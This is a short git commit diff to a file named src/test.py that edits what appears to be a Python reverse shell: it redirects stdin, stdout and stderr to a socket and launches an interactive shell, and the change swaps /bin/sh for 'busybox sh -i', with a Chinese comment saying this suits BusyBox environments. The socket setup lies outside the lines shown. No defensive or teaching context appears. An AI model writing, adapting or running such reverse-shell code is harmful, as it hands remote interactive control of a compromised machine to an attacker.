1d9112922b2ead9a315f6ef5a59d9be30cde0344
r5 <r5@>
2025-06-14 22:17:54 +0800

    1

--- src/test.py
+++ src/test.py
@@ -12,7 +12,8 @@ def main():
     os.dup2(s.fileno(), 0)  # stdin
     os.dup2(s.fileno(), 1)  # stdout
     os.dup2(s.fileno(), 2)  # stderr
-    subprocess.call(["/bin/sh", "-i"])
+    # subprocess.call(["/bin/sh", "-i"])
+    subprocess.call(["busybox", "sh", "-i"])  # 使用busybox的sh，适用于BusyBox环境
 
 if __name__ == "__main__":
     main()
